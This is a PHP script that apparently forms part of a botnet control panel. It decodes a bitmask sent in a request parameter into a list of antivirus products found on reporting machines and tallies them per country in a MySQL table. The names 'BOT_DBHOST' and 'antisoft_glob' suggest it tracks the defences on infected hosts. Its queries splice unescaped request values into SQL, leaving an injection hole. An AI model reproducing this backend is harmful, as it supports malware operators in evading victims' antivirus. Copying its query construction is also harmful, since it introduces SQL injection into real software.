<?php


include_once('softlist.php');


//require('mycommon.php');
//$mres = @mysql_connect($BOT_DBHOST,$BOT_DBLOGIN,$BOT_DBPASS) or die("Could not connect to DB.<br> MySQL Message:".mysql_error());
//if(!mysql_select_db($BOT_DBNAME))
//die('Could not select DB <br> Mysql message:'.mysql_error());



if(isset($_GET['sft'])){
 
	update_table(get_av_arr($_GET['sft']),$lg);
	
//	if(check_soft($A_SOFT,$_GET['a1']))
//	inc_soft_value($lg,'a_'.$_GET['a1']);

};



//FUCNTIONS++++++++++++++++++++++++++++++





function  update_table($SARR,$land){
	
 foreach ($SARR as $NAME){
 	
 	inc_soft_value($land,$NAME);
 	
 };
 
return '';	
	
};









function get_av_arr($str){
	global $AVIRS;
	
 for ($i=1;$i<strlen($str);$i++){
 	parse_av_inf(bin_av_inf(substr($str,$i,1)),$i); 
	   
 };
  
 return $AVIRS;	
	
};







function parse_av_inf($av_inf,$arr_pos){
global  $AVIRS,$R_ARR;

	if(@strpos($av_inf,'1')===false)
	 return 0;
	 	   	  

   if($arr_pos>count($R_ARR))
    return 0;
 
	 if(!count($AVIRS))
	   $AVIRS = array();

  if(@substr($av_inf,0,1)=='1') 
   $AVIRS[] = $R_ARR[$arr_pos][0];
  
  
    if(@substr($av_inf,1,1)=='1')
  $AVIRS[] = $R_ARR[$arr_pos][1];
   
     if(@substr($av_inf,2,1)=='1')
  $AVIRS[] = $R_ARR[$arr_pos][2];
  
return 1;
	
};








function bin_av_inf($char,$av_no=1){
	
 $dec = ord($char);	
 $bin = decbin($dec);
	
 // $bin = (substr($bin,0,1)!='0'?  '0'.$bin : $bin);
 
  $ninf= @substr($bin,3,3);
	//echo $ninf.'<br>';	//$char.'- '.$bin.' ^ '.

  return $ninf;
};







//old functions




function inc_soft_value($lg,$NAME){
	global $mres,$SOFT_TBL;

	$q = 'SELECT * FROM `'.$SOFT_TBL.'` WHERE `LAND`="'.$lg.'" LIMIT 1';
//echo $q.'<br>';

	if(!mysql_num_rows(mysql_query($q,$mres))){
		$q = 'INSERT INTO `antisoft_glob` ( `LAND` ) VALUES ("'.$lg.'")';
//echo $q.'<br>';

		@mysql_query($q,$mres);
	};

	$q = 'UPDATE `'.$SOFT_TBL.'` SET `'.$NAME.'`=`'.$NAME.'`+1 WHERE LAND="'.$lg.'"';
//echo $q.'<br>';

	@mysql_query($q,$mres);
	if(mysql_affected_rows($mres)===1){
		return 1;
	}else {

		$q = 'ALTER TABLE `'.$SOFT_TBL.'` ADD `'.$NAME.'` MEDIUMINT UNSIGNED NOT NULL DEFAULT "0"';
		mysql_query($q,$mres);

//echo $q.'<br>';

		inc_soft_value($lg,$NAME);
		return '';
	};

};





function check_soft($SOFT_ARR,$NAME){
	foreach ($SOFT_ARR as $key=>$val){
		if($key==$NAME)
		return 1;
	};
	return 0;
};




?>